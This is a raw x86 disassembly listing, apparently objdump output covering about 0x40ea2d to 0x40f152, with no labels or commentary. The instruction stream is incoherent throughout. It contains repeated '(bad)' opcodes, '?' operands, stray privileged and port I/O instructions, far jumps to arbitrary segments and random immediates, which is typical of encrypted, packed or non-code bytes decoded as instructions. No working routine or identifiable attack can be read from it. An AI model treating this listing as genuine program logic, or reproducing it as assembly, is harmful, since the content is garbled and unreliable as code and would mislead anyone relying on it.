  40ea2d:	and    al,0x99
  40ea2f:	sbb    DWORD PTR [eax],ecx
  40ea31:	mov    edx,0xa8b753e9
  40ea36:	xor    eax,0x510775bc
  40ea3b:	jl     0x40e9df
  40ea3d:	sbb    eax,0x72e1c124
  40ea42:	dec    ecx
  40ea43:	xor    esi,DWORD PTR [edi+0x2b]
  40ea46:	push   es
  40ea47:	mov    dl,0x17
  40ea49:	or     al,0xd3
  40ea4b:	fbld   TBYTE PTR [edx+eax*1-0x24d3dd3f]
  40ea52:	cwde   
  40ea53:	inc    edx
  40ea54:	lds    edi,FWORD PTR [edi+0x1d28b03d]
  40ea5a:	call   0x577d:0xbd854833
  40ea61:	js     0x40eaab
  40ea63:	ficomp WORD PTR fs:[ebx+0x13]
  40ea67:	fwait
  40ea68:	inc    ebx
  40ea69:	repnz jmp 0x34dd:0x55f19494
  40ea71:	add    BYTE PTR [ebp-0x30],0x85
  40ea75:	daa    
  40ea76:	sbb    al,0x0
  40ea78:	ret    
  40ea79:	mov    eax,0x693894ae
  40ea7e:	add    eax,0xf7efff27
  40ea83:	pop    ecx
  40ea84:	xchg   esp,eax
  40ea85:	into   
  40ea86:	xchg   edx,eax
  40ea87:	in     al,0x6d
  40ea89:	pop    ss
  40ea8a:	adc    esi,ebp
  40ea8c:	(bad)  
  40ea8d:	pop    ss
  40ea8e:	scas   eax,DWORD PTR es:[edi]
  40ea8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea90:	mov    ds:0x75e93ead,al
  40ea95:	clc    
  40ea96:	je     0x40eae5
  40ea98:	adc    esp,DWORD PTR [edi-0x5b]
  40ea9b:	mov    ch,0xe0
  40ea9d:	outs   dx,DWORD PTR ds:[esi]
  40ea9e:	dec    esp
  40ea9f:	dec    eax
  40eaa0:	add    BYTE PTR [edi-0x38ac0aee],bl
  40eaa6:	push   es
  40eaa7:	std    
  40eaa8:	out    dx,eax
  40eaa9:	scas   al,BYTE PTR es:[edi]
  40eaaa:	fs and eax,0x4e42658a
  40eab0:	test   eax,0x520fc61f
  40eab5:	stc    
  40eab6:	jmp    0x5de2fe9a
  40eabb:	js     0x40eab2
  40eabd:	stc    
  40eabe:	mov    cl,0x80
  40eac0:	add    eax,DWORD PTR [esi+edx*4+0x53]
  40eac4:	mov    eax,ds:0x6166675e
  40eac9:	dec    edi
  40eaca:	clc    
  40eacb:	sbb    eax,ebx
  40eacd:	and    al,0xc3
  40eacf:	xchg   esi,eax
  40ead0:	aaa    
  40ead1:	in     al,dx
  40ead2:	cmp    edi,esp
  40ead4:	mov    ebp,ebp
  40ead6:	mov    WORD PTR [esi],fs
  40ead8:	std    
  40ead9:	rcl    BYTE PTR [ebp-0x56],cl
  40eadc:	dec    esi
  40eadd:	push   0xbe4861f9
  40eae2:	xchg   esi,eax
  40eae3:	mov    al,ds:0xe7702a63
  40eae8:	jmp    0x4309bcb3
  40eaed:	sbb    dh,BYTE PTR cs:[ebx]
  40eaf0:	inc    esp
  40eaf1:	dec    ebx
  40eaf2:	(bad)  
  40eaf3:	sbb    BYTE PTR [edx],cl
  40eaf5:	sbb    DWORD PTR ds:0x2b673aa9,esp
  40eafb:	fwait
  40eafc:	push   ebp
  40eafd:	loope  0x40eacf
  40eaff:	jnp    0x40eb7d
  40eb01:	bound  ebp,QWORD PTR [edi]
  40eb03:	sub    DWORD PTR [edi-0x26],ebp
  40eb06:	fs mov edx,0x6af3cd7a
  40eb0c:	push   ss
  40eb0d:	inc    ebp
  40eb0e:	or     DWORD PTR [esi],0xffffffb8
  40eb11:	cmp    al,ah
  40eb13:	fdivr  st(0),st
  40eb15:	cmp    DWORD PTR [esi],edi
  40eb17:	add    al,0x32
  40eb19:	das    
  40eb1a:	dec    eax
  40eb1b:	jp     0x40eb95
  40eb1d:	inc    edi
  40eb1e:	mov    edi,0x7f64c1ad
  40eb23:	jle    0x40eae4
  40eb25:	xor    BYTE PTR [ecx+0x70],cl
  40eb28:	xlat   BYTE PTR ds:[ebx]
  40eb29:	dec    esi
  40eb2a:	xchg   ebx,eax
  40eb2b:	sub    BYTE PTR [edx-0x16],dh
  40eb2e:	inc    edi
  40eb2f:	std    
  40eb30:	popf   
  40eb31:	mov    dl,0xe7
  40eb33:	in     al,dx
  40eb34:	loopne 0x40ebb5
  40eb36:	nop
  40eb37:	std    
  40eb38:	lods   eax,DWORD PTR ds:[esi]
  40eb39:	or     al,0xa7
  40eb3b:	fwait
  40eb3c:	leave  
  40eb3d:	cmp    dh,ah
  40eb3f:	xor    al,0x3b
  40eb41:	loop   0x40eb82
  40eb43:	and    ch,BYTE PTR [esi+ebp*1-0x1687724f]
  40eb4a:	sbb    dh,dh
  40eb4c:	leave  
  40eb4d:	inc    ebp
  40eb4e:	mov    cs,WORD PTR [edi+edi*4]
  40eb51:	retf   0x3e7f
  40eb54:	bound  edi,QWORD PTR [ebx-0x7b]
  40eb57:	cmp    ah,BYTE PTR [ebp-0x72fefff4]
  40eb5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb5e:	(bad)  
  40eb5f:	adc    BYTE PTR ds:0x41a355e2,dh
  40eb65:	add    al,0xd2
  40eb67:	(bad)  
  40eb68:	stos   BYTE PTR es:[edi],al
  40eb69:	jo     0x40eb72
  40eb6b:	sbb    bh,BYTE PTR [edx-0x4f]
  40eb6e:	or     BYTE PTR [edi+eax*4-0x2d],bl
  40eb72:	ss jnp 0x40ebb8
  40eb75:	and    BYTE PTR [ecx-0x23],0xec
  40eb79:	cmp    edi,DWORD PTR [edx]
  40eb7b:	inc    ebp
  40eb7c:	xchg   ebp,eax
  40eb7d:	add    ah,al
  40eb7f:	xor    BYTE PTR [edi+0x4b12e2ff],0x53
  40eb86:	push   es
  40eb87:	fild   WORD PTR [edi]
  40eb89:	sar    DWORD PTR ds:0xbdd919fe,1
  40eb8f:	cwde   
  40eb90:	loopne 0x40eb4c
  40eb92:	(bad)  
  40eb93:	retf   
  40eb94:	push   ebp
  40eb95:	repz mov dl,BYTE PTR [ecx+0x24]
  40eb99:	retf   0x1aaf
  40eb9c:	ja     0x40eb45
  40eb9e:	mov    al,0x94
  40eba0:	or     BYTE PTR [ecx],0x21
  40eba3:	xchg   DWORD PTR [esi+0x43],esi
  40eba6:	dec    edx
  40eba7:	call   0xd90e:0x8d1b6396
  40ebae:	push   ds
  40ebaf:	and    DWORD PTR [esi],edx
  40ebb1:	leave  
  40ebb2:	dec    edi
  40ebb3:	xor    dl,BYTE PTR [eax]
  40ebb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebb7:	cmc    
  40ebb8:	push   ebp
  40ebb9:	je     0x40ebec
  40ebbb:	sub    DWORD PTR [eax-0x56159aa2],0xf4b38681
  40ebc5:	cmp    al,0x7d
  40ebc7:	xor    dh,BYTE PTR [eax]
  40ebc9:	pop    ss
  40ebca:	jl     0x40ebc8
  40ebcc:	shr    DWORD PTR [edx],1
  40ebce:	loope  0x40ec16
  40ebd0:	push   esi
  40ebd1:	and    edx,ecx
  40ebd3:	xor    bl,cl
  40ebd5:	or     DWORD PTR [ebp+0x71c9e890],ecx
  40ebdb:	shr    DWORD PTR [eax+0x5aee6054],0x34
  40ebe2:	xchg   bh,dh
  40ebe4:	mov    ecx,0x9f7847d0
  40ebe9:	inc    ebx
  40ebea:	mov    dh,0xe9
  40ebec:	pop    eax
  40ebed:	mov    ebp,DWORD PTR [bx+si-0x29]
  40ebf1:	sub    DWORD PTR [esi-0x7df9ad89],0x5aa0bf0f
  40ebfb:	loop   0x40ebe4
  40ebfd:	cwde   
  40ebfe:	sbb    al,BYTE PTR [edi+0x4b]
  40ec01:	(bad)  
  40ec02:	fdiv   st(5),st
  40ec04:	xor    dh,bh
  40ec06:	icebp  
  40ec07:	cmp    esi,ebx
  40ec09:	xor    BYTE PTR [edi],dh
  40ec0b:	inc    ecx
  40ec0c:	arpl   WORD PTR [ebx-0x15],bp
  40ec0f:	test   BYTE PTR [ecx+0x66],0xc0
  40ec13:	xchg   ecx,eax
  40ec14:	add    al,0xf9
  40ec16:	pusha  
  40ec17:	(bad)  
  40ec18:	push   ecx
  40ec19:	xchg   esp,eax
  40ec1a:	sar    BYTE PTR [ecx+0xd],cl
  40ec1d:	sbb    DWORD PTR [ebp+0x2c],esp
  40ec20:	lods   al,BYTE PTR ds:[esi]
  40ec21:	retf   
  40ec22:	mov    ch,BYTE PTR [esi]
  40ec24:	jns    0x40ec33
  40ec26:	retf   0xed2a
  40ec29:	jae    0x40ec7b
  40ec2b:	aad    0x9d
  40ec2d:	xor    esp,edx
  40ec2f:	idiv   DWORD PTR [eax-0x5b]
  40ec32:	sbb    al,0xc3
  40ec34:	dec    esp
  40ec35:	not    BYTE PTR [ecx+0x14]
  40ec38:	lea    esi,[esi]
  40ec3a:	xor    edi,ebp
  40ec3c:	cmc    
  40ec3d:	sub    ecx,ebp
  40ec3f:	pusha  
  40ec40:	jmp    0xb443:0x2aaee770
  40ec47:	jns    0x40ec6a
  40ec49:	scas   eax,DWORD PTR es:[edi]
  40ec4a:	adc    al,0x80
  40ec4c:	mov    eax,ds:0x54ba0d
  40ec51:	jnp    0x40ec8b
  40ec53:	dec    edi
  40ec54:	stos   DWORD PTR es:[edi],eax
  40ec55:	cmp    BYTE PTR [edi+ebx*1-0x12e82907],0x69
  40ec5d:	jmp    0x40ecc5
  40ec5f:	loopne 0x40ecae
  40ec61:	mov    ?,ebx
  40ec63:	xchg   DWORD PTR [ebp-0x6e021abb],edi
  40ec69:	pop    eax
  40ec6a:	cmp    al,0x74
  40ec6c:	stc    
  40ec6d:	adc    ch,BYTE PTR [edx+0x2c5a3682]
  40ec73:	cmova  bx,WORD PTR [eax-0x1a]
  40ec78:	inc    esi
  40ec79:	inc    esp
  40ec7a:	mov    eax,0xda6e4f23
  40ec7f:	mov    bh,0xbf
  40ec81:	outs   dx,DWORD PTR ds:[esi]
  40ec82:	xchg   DWORD PTR [eax],ebx
  40ec84:	clc    
  40ec85:	xchg   ecx,eax
  40ec86:	fidivr DWORD PTR [ebx]
  40ec88:	dec    esp
  40ec89:	jns    0x40ec6d
  40ec8b:	mov    bh,0xc6
  40ec8d:	xchg   esp,eax
  40ec8e:	sbb    al,0xec
  40ec90:	popa   
  40ec91:	popa   
  40ec92:	aaa    
  40ec93:	pop    ss
  40ec94:	sbb    BYTE PTR [esi-0x23],dl
  40ec97:	cmp    DWORD PTR [edi-0x3036999c],eax
  40ec9d:	xchg   BYTE PTR [edx+0x54e8cd91],bh
  40eca3:	pshufw mm0,QWORD PTR [ecx],0xa1
  40eca7:	inc    edx
  40eca8:	icebp  
  40eca9:	sbb    esp,ecx
  40ecab:	(bad)  
  40ecac:	ins    DWORD PTR es:[edi],dx
  40ecad:	push   cs
  40ecae:	aaa    
  40ecaf:	retf   0xa46c
  40ecb2:	jno    0x40ec7b
  40ecb4:	adc    bl,al
  40ecb6:	dec    edx
  40ecb7:	test   eax,0xc1c0d89a
  40ecbc:	jbe    0x40ecbe
  40ecbe:	mov    dl,BYTE PTR [ebp+edx*8+0x585aa06f]
  40ecc5:	mov    BYTE PTR [ecx+0x12],ah
  40ecc8:	retf   0x40e2
  40eccb:	mov    ds:0x2a0005b5,eax
  40ecd0:	push   0x35
  40ecd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecd3:	mov    ds:0xbcfbc523,eax
  40ecd8:	adc    DWORD PTR [ebp+edx*4-0x196cf7e4],eax
  40ecdf:	pop    edi
  40ece0:	push   edx
  40ece1:	jmp    0x9c93f895
  40ece6:	fs retf 0x3cbf
  40ecea:	hlt    
  40eceb:	fnstsw WORD PTR [edx+0x4]
  40ecee:	push   esi
  40ecef:	out    0x6e,eax
  40ecf1:	icebp  
  40ecf2:	bound  ecx,QWORD PTR [edx+0x7]
  40ecf5:	mov    WORD PTR [ebx],?
  40ecf7:	rol    DWORD PTR [ebp-0x4f77133d],cl
  40ecfd:	mov    bh,0x90
  40ecff:	hlt    
  40ed00:	sti    
  40ed01:	mov    al,ds:0x8ed0d9b0
  40ed06:	pop    edx
  40ed07:	sbb    DWORD PTR [edi-0x34721adb],esi
  40ed0d:	mov    ecx,0xd100be1f
  40ed12:	pop    ecx
  40ed13:	mov    cl,0x54
  40ed15:	inc    edx
  40ed16:	(bad)  
  40ed17:	ss pushf 
  40ed19:	arpl   WORD PTR [ecx+0x4ccfa0e3],dx
  40ed1f:	cld    
  40ed20:	xchg   esi,eax
  40ed21:	lahf   
  40ed22:	sub    bh,BYTE PTR [ebp+0xf5c7024]
  40ed28:	pop    esp
  40ed29:	aas    
  40ed2a:	mov    edi,0x36860296
  40ed2f:	pop    ebx
  40ed30:	mov    BYTE PTR [esi],dl
  40ed32:	aam    0x1b
  40ed34:	mov    cl,0xbd
  40ed36:	dec    ebx
  40ed37:	cli    
  40ed38:	xchg   DWORD PTR [ebp+0x73d9f83c],ecx
  40ed3e:	fwait
  40ed3f:	ds add DWORD PTR gs:[edx-0xf],ebx
  40ed44:	mov    bh,0x93
  40ed46:	adc    al,BYTE PTR [esp+esi*1]
  40ed49:	lods   eax,DWORD PTR ds:[esi]
  40ed4a:	mov    DWORD PTR [ecx],edx
  40ed4c:	inc    ebp
  40ed4d:	xchg   ecx,eax
  40ed4e:	dec    esp
  40ed4f:	push   esp
  40ed50:	shl    DWORD PTR [edx],cl
  40ed52:	cmp    BYTE PTR [ebx-0x6b04b16e],bh
  40ed58:	aas    
  40ed59:	or     ebx,esp
  40ed5b:	(bad)  
  40ed5c:	mov    bl,0x12
  40ed5e:	xor    al,0x36
  40ed60:	add    eax,0x9246af01
  40ed65:	mov    bh,0x1
  40ed67:	fdivr  DWORD PTR [eax+0x4d]
  40ed6a:	or     DWORD PTR [esi+0x30],ebx
  40ed6d:	push   ebx
  40ed6e:	xchg   edi,eax
  40ed6f:	add    cl,BYTE PTR [edi]
  40ed71:	fst    DWORD PTR [esi+0x3d]
  40ed74:	stos   BYTE PTR es:[edi],al
  40ed75:	sub    dh,bl
  40ed77:	dec    ecx
  40ed78:	push   edx
  40ed79:	sbb    bh,BYTE PTR [eax-0x260603a7]
  40ed7f:	je     0x40edf8
  40ed81:	ds add eax,esp
  40ed84:	repnz (bad) 
  40ed86:	mov    ds:0xf186ef7a,eax
  40ed8b:	cmp    al,BYTE PTR [ecx-0x3e]
  40ed8e:	aad    0x91
  40ed90:	xchg   edx,eax
  40ed91:	cwde   
  40ed92:	out    0x59,eax
  40ed94:	sub    ebx,eax
  40ed96:	aas    
  40ed97:	sbb    ecx,DWORD PTR [edi+esi*8]
  40ed9a:	es out 0xd1,al
  40ed9d:	inc    edi
  40ed9e:	ror    DWORD PTR [esi],1
  40eda0:	mov    dh,0xdc
  40eda2:	loop   0x40ed8a
  40eda4:	mov    cl,0x83
  40eda6:	sbb    eax,0x87d32502
  40edab:	(bad)
  40edae:	mov    ch,ah
  40edb0:	push   es
  40edb1:	sbb    ah,BYTE PTR [esi+0x3e]
  40edb4:	stc    
  40edb5:	leave  
  40edb6:	cmp    al,0xb0
  40edb8:	bnd jae 0x40ee3a
  40edbb:	push   cs
  40edbc:	pop    esp
  40edbd:	test   al,0xb3
  40edbf:	mov    ch,0xe0
  40edc1:	sti    
  40edc2:	cwde   
  40edc3:	repnz aas 
  40edc5:	pop    edx
  40edc6:	mov    bh,0x2d
  40edc8:	dec    edx
  40edc9:	ins    BYTE PTR es:[edi],dx
  40edca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edcb:	cld    
  40edcc:	imul   dh
  40edce:	inc    eax
  40edcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edd0:	int3   
  40edd1:	sub    BYTE PTR [ecx],cl
  40edd3:	call   FWORD PTR [esi+esi*2]
  40edd6:	sub    bh,BYTE PTR [ecx+0x1d]
  40edd9:	cmp    DWORD PTR [ebx+0x6e],esi
  40eddc:	xlat   BYTE PTR ds:[ebx]
  40eddd:	add    DWORD PTR [esi+edi*1],ebx
  40ede0:	mov    BYTE PTR [edi-0x1ab1957d],dh
  40ede6:	push   es
  40ede7:	nop
  40ede8:	(bad)  
  40ede9:	or     ah,al
  40edeb:	sub    ebp,DWORD PTR [ebp-0x26d67004]
  40edf1:	and    ebp,ebx
  40edf3:	dec    edi
  40edf4:	loopne 0x40edd4
  40edf6:	mov    al,0x1d
  40edf8:	xchg   ebx,eax
  40edf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edfa:	or     DWORD PTR [ebx+0x4deb9971],ecx
  40ee00:	push   es
  40ee01:	and    DWORD PTR ds:0x6643b0ad,edx
  40ee07:	or     ch,BYTE PTR [edi-0x36]
  40ee0a:	mov    esp,0x4d76a670
  40ee0f:	add    ah,bl
  40ee11:	lods   al,BYTE PTR ds:[esi]
  40ee12:	sbb    al,0xac
  40ee14:	sahf   
  40ee15:	test   BYTE PTR [ecx],al
  40ee17:	in     al,dx
  40ee18:	nop
  40ee19:	arpl   WORD PTR [edi+0x14],dx
  40ee1c:	fcmove st,st(3)
  40ee1e:	cmp    edx,0xffffffda
  40ee21:	enter  0xc946,0x7e
  40ee25:	pop    ebx
  40ee26:	icebp  
  40ee27:	jmp    0x5b5b0d76
  40ee2c:	xchg   ecx,eax
  40ee2d:	or     eax,0x3cff75f2
  40ee32:	sahf   
  40ee33:	loope  0x40ee72
  40ee35:	mov    al,0x4b
  40ee37:	call   0xe7ba:0x696e3e8f
  40ee3e:	addr16 pop es
  40ee40:	mov    dl,0xd6
  40ee42:	pushf  
  40ee43:	xlat   BYTE PTR ds:[ebx]
  40ee44:	hlt    
  40ee45:	out    0xfc,al
  40ee47:	jle    0x40ee86
  40ee49:	cld    
  40ee4a:	jae    0x40edee
  40ee4c:	fwait
  40ee4d:	cmp    DWORD PTR [esi-0x15b90471],eax
  40ee53:	ret    0xd8b5
  40ee56:	adc    BYTE PTR [ecx-0x727ac917],cl
  40ee5c:	mov    esi,edx
  40ee5e:	lods   eax,DWORD PTR ds:[esi]
  40ee5f:	cli    
  40ee60:	pop    ebx
  40ee61:	out    0x5d,eax
  40ee63:	sub    al,0x5c
  40ee65:	fdiv   DWORD PTR [edi+0x526a32de]
  40ee6b:	xor    DWORD PTR [edx],edi
  40ee6d:	mov    ch,0x10
  40ee6f:	push   0xffffffb9
  40ee71:	hlt    
  40ee72:	xchg   edi,eax
  40ee73:	rcr    DWORD PTR [edi+0x11052ab3],cl
  40ee79:	stc    
  40ee7a:	mov    DWORD PTR ds:0xf34cac4b,edx
  40ee80:	(bad)  
  40ee81:	retf   
  40ee82:	jbe    0x40eefd
  40ee84:	jmp    0x5362:0x5d432ab0
  40ee8b:	call   0x3614:0xa9394c03
  40ee92:	push   ebx
  40ee93:	xchg   edi,eax
  40ee94:	xchg   ebx,eax
  40ee95:	cwde   
  40ee96:	jmp    0xf14f:0xdf94ef76
  40ee9d:	ss bnd ja 0x40ee86
  40eea1:	or     BYTE PTR [eax],cl
  40eea3:	cmp    esi,ebp
  40eea5:	or     al,0xbf
  40eea7:	in     eax,dx
  40eea8:	gs out 0xe9,al
  40eeab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeac:	add    eax,0x219e5990
  40eeb1:	jmp    0x886e:0x99d90886
  40eeb8:	test   BYTE PTR [eax+0x31],dl
  40eebb:	sbb    ah,BYTE PTR [edi+0x4573bf]
  40eec1:	xor    al,BYTE PTR [ecx+0x69fc678d]
  40eec7:	adc    DWORD PTR [esi-0x40],esi
  40eeca:	mov    ds:0x6f23d81e,al
  40eecf:	pusha  
  40eed0:	jg     0x40ee73
  40eed2:	sub    eax,0x78e00964
  40eed7:	xor    ebp,DWORD PTR [edi+0x5a23eca1]
  40eedd:	pop    edx
  40eede:	push   edx
  40eedf:	xor    ebx,DWORD PTR [edx]
  40eee1:	push   ss
  40eee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eee3:	dec    ebp
  40eee4:	mov    al,0xe8
  40eee6:	push   edx
  40eee7:	or     al,BYTE PTR [edx-0x598803d4]
  40eeed:	rcl    ah,1
  40eeef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eef0:	adc    ebp,DWORD PTR [edi-0x3b7f408]
  40eef6:	jb     0x40eee0
  40eef8:	(bad)  
  40eef9:	repz mov al,ds:0x704290e
  40eeff:	dec    esi
  40ef00:	fucomip st,st(4)
  40ef02:	cdq    
  40ef03:	inc    edx
  40ef04:	sbb    bh,BYTE PTR [ebp-0x75]
  40ef07:	nop
  40ef08:	jno    0x40ef1d
  40ef0a:	leave  
  40ef0b:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef0d:	scas   al,BYTE PTR es:[edi]
  40ef0e:	add    al,0x68
  40ef10:	repz shl ch,0xf9
  40ef14:	nop
  40ef15:	adc    bh,BYTE PTR ds:0x13119e25
  40ef1b:	out    dx,eax
  40ef1c:	mov    ds:0xdd4d3fe2,eax
  40ef21:	popf   
  40ef22:	imul   esp,DWORD PTR [edx+0x2d4521ce],0xfffffff3
  40ef29:	push   0xffffffe7
  40ef2b:	hlt    
  40ef2c:	or     DWORD PTR [edi-0x483d851d],eax
  40ef32:	push   edi
  40ef33:	push   ecx
  40ef34:	adc    dl,0x51
  40ef37:	fadd   st,st(1)
  40ef39:	or     dl,bl
  40ef3b:	mov    edx,0x804f6620
  40ef40:	xor    DWORD PTR [ebx],0x2a
  40ef43:	sub    ah,BYTE PTR [eax+edx*4]
  40ef46:	fs xchg ecx,eax
  40ef48:	xchg   ebp,eax
  40ef49:	push   edi
  40ef4a:	inc    edi
  40ef4b:	mov    bl,0xa
  40ef4d:	or     bl,BYTE PTR ds:0x400b3149
  40ef53:	lods   al,BYTE PTR ds:[esi]
  40ef54:	in     al,dx
  40ef55:	stos   BYTE PTR es:[edi],al
  40ef56:	xchg   esp,eax
  40ef57:	int    0x93
  40ef59:	pop    ds
  40ef5a:	test   DWORD PTR [ebx+0x4a],0x1ed94197
  40ef61:	rcl    BYTE PTR [edx],1
  40ef63:	fstp   DWORD PTR [ebx-0x30db7202]
  40ef69:	cmp    BYTE PTR [edx+0x3847ba02],dl
  40ef6f:	dec    ecx
  40ef70:	xor    al,0x7
  40ef72:	ins    BYTE PTR es:[edi],dx
  40ef73:	sbb    BYTE PTR [edi+0x3c48086],ch
  40ef79:	arpl   sp,cx
  40ef7b:	sbb    al,0x47
  40ef7d:	or     eax,0xfcea8495
  40ef82:	sub    ebx,DWORD PTR [ebx-0x47]
  40ef85:	mov    bl,0x93
  40ef87:	dec    ebp
  40ef88:	adc    ecx,edi
  40ef8a:	jp     0x40eff2
  40ef8c:	dec    edi
  40ef8d:	mov    ebx,0x5bc1525c
  40ef92:	cmc    
  40ef93:	repz jnp 0x40ef6f
  40ef96:	sub    al,0x5e
  40ef98:	retf   0xc2a
  40ef9b:	or     BYTE PTR [ebx-0x3f],ch
  40ef9e:	sub    al,BYTE PTR [esi+0x3d]
  40efa1:	(bad)  
  40efa2:	sti    
  40efa3:	pop    edi
  40efa4:	outs   dx,BYTE PTR ds:[esi]
  40efa5:	adc    bh,BYTE PTR [edx+0x665581ea]
  40efab:	xlat   BYTE PTR ds:[ebx]
  40efac:	aad    0x74
  40efae:	out    dx,eax
  40efaf:	fisub  DWORD PTR [eax-0x512fe51b]
  40efb5:	stos   DWORD PTR es:[edi],eax
  40efb6:	lock retf 
  40efb8:	out    dx,al
  40efb9:	jmp    0x77991885
  40efbe:	xchg   ebp,eax
  40efbf:	fcomp  DWORD PTR [ecx-0x11]
  40efc2:	rcl    dh,0x2d
  40efc5:	mov    dh,0x54
  40efc7:	cmp    DWORD PTR [ecx+0x15],0xe7932907
  40efce:	fdivr  QWORD PTR [ecx]
  40efd0:	out    dx,al
  40efd1:	and    ah,BYTE PTR [edx]
  40efd3:	or     ah,BYTE PTR [esi]
  40efd5:	cmp    ecx,edi
  40efd7:	lahf   
  40efd8:	sbb    eax,DWORD PTR [ecx]
  40efda:	sub    al,0xaf
  40efdc:	jge    0x40efd6
  40efde:	mov    bh,0x13
  40efe0:	mov    edi,0xcfc5b661
  40efe5:	ins    DWORD PTR es:[edi],dx
  40efe6:	test   BYTE PTR [esi+0x4bf691cb],cl
  40efec:	sbb    BYTE PTR [edi+0x28],dl
  40efef:	fld    TBYTE PTR [edi]
  40eff1:	mov    ebp,0x63b2ead9
  40eff6:	aas    
  40eff7:	test   al,0x2b
  40eff9:	stos   DWORD PTR es:[edi],eax
  40effa:	jg     0x40f045
  40effc:	pop    ss
  40effd:	and    BYTE PTR [ebx],0xe8
  40f000:	pop    edi
  40f001:	iret   
  40f002:	imul   ebp,DWORD PTR [ebx-0x42],0x30d17ede
  40f009:	dec    esp
  40f00a:	jnp    0x40f02b
  40f00c:	cwde   
  40f00d:	push   eax
  40f00e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f00f:	mov    ah,0x14
  40f011:	inc    edx
  40f012:	jnp    0x40efa3
  40f014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f015:	pop    ecx
  40f016:	test   eax,0xd11ab5d6
  40f01b:	into   
  40f01c:	inc    edx
  40f01d:	or     esi,DWORD PTR [esi]
  40f01f:	xor    DWORD PTR [edi-0x78],edi
  40f022:	loop   0x40f00d
  40f024:	jo     0x40efde
  40f026:	push   edi
  40f027:	(bad)  
  40f028:	push   ebp
  40f029:	mov    edi,0x14454811
  40f02e:	call   0xf474fd64
  40f033:	(bad)  
  40f034:	out    dx,al
  40f035:	or     DWORD PTR [edx-0x58e6c94b],esp
  40f03b:	ret    0x357b
  40f03e:	and    eax,DWORD PTR [esi+0x5]
  40f041:	adc    eax,0x7ceb4e65
  40f046:	pop    es
  40f047:	fcmovu st,st(3)
  40f049:	iret   
  40f04a:	mov    al,ds:0xf28e8dad
  40f04f:	mov    ebp,0x5b0365a2
  40f054:	cld    
  40f055:	mov    esi,0x270cbc69
  40f05a:	push   ebp
  40f05b:	sub    ebx,esi
  40f05d:	mov    ebx,DWORD PTR [ebp+0x6f1bb601]
  40f063:	fld    QWORD PTR [edx+0x5ce3f3a]
  40f069:	dec    ebx
  40f06a:	ficomp DWORD PTR [ecx+0x6d58cd41]
  40f070:	and    DWORD PTR [ebp+ebp*1-0x21],edx
  40f074:	mov    ds:0xc41d9632,eax
  40f079:	aas    
  40f07a:	cmp    esp,edx
  40f07c:	push   0xa9d64cf7
  40f081:	mov    ?,WORD PTR [edi+ecx*1]
  40f084:	pop    es
  40f085:	sbb    ebx,ecx
  40f087:	das    
  40f088:	xchg   BYTE PTR [eax+0x5473a497],bh
  40f08e:	int    0xd8
  40f090:	add    BYTE PTR [edx],al
  40f092:	lock test al,ah
  40f095:	add    eax,ecx
  40f097:	rcl    BYTE PTR [edi+0x25],0xd
  40f09b:	lods   eax,DWORD PTR ds:[esi]
  40f09c:	push   esi
  40f09d:	(bad)  
  40f09f:	inc    ebx
  40f0a0:	inc    edi
  40f0a1:	in     al,dx
  40f0a2:	xor    al,0x11
  40f0a4:	xor    DWORD PTR [ecx+0x77],eax
  40f0a7:	daa    
  40f0a8:	mov    al,ds:0xc73d972
  40f0ad:	ja     0x40f0fa
  40f0af:	xchg   ebx,eax
  40f0b1:	mov    bl,0xb1
  40f0b3:	lahf   
  40f0b4:	cmp    BYTE PTR [eax+0x5ca47c86],bh
  40f0ba:	add    BYTE PTR [edi-0x42],ch
  40f0bd:	mov    eax,0xbcbb49c1
  40f0c2:	or     al,0x5
  40f0c4:	add    BYTE PTR [ebp+0xc4cd87a],dl
  40f0ca:	push   ecx
  40f0cb:	mov    ebx,0x7fce4205
  40f0d0:	rcl    ecx,cl
  40f0d2:	call   0xb5f6fa1c
  40f0d7:	sbb    esp,DWORD PTR [eax+0x41b588a9]
  40f0dd:	mov    bh,0xb6
  40f0df:	xchg   edx,eax
  40f0e0:	jp     0x40f11a
  40f0e2:	pop    eax
  40f0e3:	sub    eax,0xa3c9a6aa
  40f0e8:	jmp    0x4b0d:0xad3cd545
  40f0ef:	jnp    0x40f0eb
  40f0f1:	add    esp,esi
  40f0f3:	push   0x2b5a6124
  40f0f8:	sub    DWORD PTR [esi-0x3e],edx
  40f0fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0fc:	sub    ah,BYTE PTR ds:0x3f253e79
  40f102:	fldcw  WORD PTR [edi+0x73937bed]
  40f108:	dec    eax
  40f109:	repz dec edi
  40f10b:	pusha  
  40f10c:	outs   dx,DWORD PTR ds:[esi]
  40f10d:	in     al,dx
  40f10e:	dec    ebx
  40f10f:	test   eax,0x34698ae2
  40f114:	pop    edi
  40f115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f116:	fcom   DWORD PTR [ebp-0x47]
  40f119:	fs pop ebp
  40f11b:	inc    ecx
  40f11c:	daa    
  40f11d:	xchg   esp,eax
  40f11e:	sbb    al,0xce
  40f120:	ret    0xa037
  40f123:	loop   0x40f0f6
  40f125:	rcl    ebx,1
  40f127:	pusha  
  40f128:	xor    cl,BYTE PTR [ecx]
  40f12a:	push   edi
  40f12b:	adc    DWORD PTR [esi-0x4081006e],0x56a0b47d
  40f135:	pop    edi
  40f136:	inc    esi
  40f137:	ja     0x40f12c
  40f139:	xor    esp,DWORD PTR ds:0xe4800c8f
  40f13f:	sub    ah,BYTE PTR [ebx-0x3f]
  40f142:	adc    BYTE PTR [ebx],cl
  40f144:	aam    0x89
  40f146:	call   0x2446a4f9
  40f14b:	adc    DWORD PTR [esi+eax*1-0x13ca1f5],esp
  40f152:	mov    WORD PTR [edx-0x1a],cs
